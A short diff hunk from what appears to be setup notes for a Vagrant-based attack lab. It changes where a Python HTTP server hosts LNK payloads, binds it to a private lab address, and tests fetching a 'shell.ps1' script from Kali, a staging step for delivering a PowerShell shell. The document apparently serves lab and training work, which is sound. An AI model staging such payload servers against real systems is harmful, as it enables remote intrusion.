@@ -235,8 +235,8 @@ sudo systemctl status lnk-http-server.service
 sudo systemctl start lnk-http-server.service
 
 # Or start manually if needed
-cd /vagrant/exploits/lnk
-python3 -m http.server 8080 &
+cd /home/vagrant/lnk_payloads
+python3 -m http.server 8080 --bind 192.168.56.101 &
 
 # Test from Kali
 curl http://192.168.56.101:8080/shell.ps1
